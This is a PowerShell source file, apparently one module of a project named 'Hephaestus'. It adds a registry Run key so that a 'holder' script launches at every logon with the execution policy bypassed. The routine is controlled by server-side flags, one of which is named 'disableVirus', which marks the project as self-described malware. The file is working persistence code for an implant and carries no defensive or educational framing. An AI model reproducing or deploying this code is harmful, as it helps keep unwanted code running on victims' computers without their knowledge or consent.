. ./utils.ps1
. ./consts_body.ps1

function Add-HolderToStartup {
    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $keyName = "Hephaestus"
    
    $holderPath = Get-HolderPath
    $powershellCommand = "powershell.exe -ExecutionPolicy Bypass -File `"$holderPath`" -ArgumentList '-autostart'"

    try {
        if (Test-Path -Path $registryPath) {
            $currentValue = Get-ItemProperty -Path $registryPath -Name $keyName -ErrorAction SilentlyContinue

            if ($currentValue.$keyName -eq $powershellCommand) {
                writedbg "The 'Hephaestus' key is already set with the correct value." -ForegroundColor Green
            } else {
                Set-ItemProperty -Path $registryPath -Name $keyName -Value $powershellCommand
                writedbg "'Hephaestus' key updated with the correct value." -ForegroundColor Green
            }
        } else {
            New-Item -Path $registryPath -Force | Out-Null
            New-ItemProperty -Path $registryPath -Name $keyName -Value $powershellCommand -PropertyType String -Force | Out-Null
            writedbg "'Hephaestus' key added to startup." -ForegroundColor Green
        }
    } catch {
        writedbg "Error while adding/updating the 'Hephaestus' key: $($_.Exception.Message)" -ForegroundColor Red
    }
}

function do_autoregistry {
    if ($server.disableVirus)
    {
        return
    }
    try 
    {
        if ($server.autoStart)
        {
            Add-HolderToStartup
        }
    } catch {
        writedbg "Error  DoRegistryAutoStart $_"
    }
}